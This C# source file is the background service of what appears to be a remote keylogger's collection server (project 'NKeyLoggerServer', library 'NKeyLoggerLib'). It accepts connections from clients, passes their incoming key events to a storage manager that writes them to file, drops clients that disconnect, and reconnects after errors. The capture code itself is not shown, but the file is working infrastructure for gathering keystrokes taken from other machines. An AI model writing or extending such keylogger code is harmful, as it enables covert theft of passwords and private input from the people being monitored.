using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;

namespace NKeyLoggerServer;
internal class ServiceWorker : BackgroundWorker, IHostedService
{
    private static string settingPath = "setting.txt";
    private static int waitForReconnect = 500;
    private AbstractSetting setting { get; init; }
    private Server server { get; init; }
    private StorageManager manager { get; init; }
    public ServiceWorker() : base()
    {
        setting = new ConstSetting(settingPath, true);
        server = new Server(setting);
        manager = new StorageManager(setting);
    }
    public async Task StartAsync(CancellationToken cancellationToken)
    {
        try
        {
            server.disconnectClient += manager.removeClient;
            server.keyHandler += manager.saveToFile;

            CancellationTokenSource cancelWait = new CancellationTokenSource();
            var waitTask = Task.Run(() =>
            {
                while (!cancellationToken.IsCancellationRequested && !cancelWait.Token.IsCancellationRequested) { }
                server.stop();
            });

            var startTask = server.start();
            server.updateTask += (Task t) =>
            {
                if (!t.IsCanceled)
                    startTask = t;
            };
        again:
            try
            {
                if (!startTask.IsCanceled)
                    await startTask;
            }
            catch (AggregateException)
            {
                Thread.Sleep(waitForReconnect);
                if (!startTask.IsCanceled)
                    goto again;
            }
            cancelWait.Cancel();
        }
        catch (Exception ex)
        {
            Log<Program>.Instance.logger?.LogError(ex.ToString());
        }
    }

    public async Task StopAsync(CancellationToken cancellationToken)
    {
        await Task.Run(server.stop);
    }
}
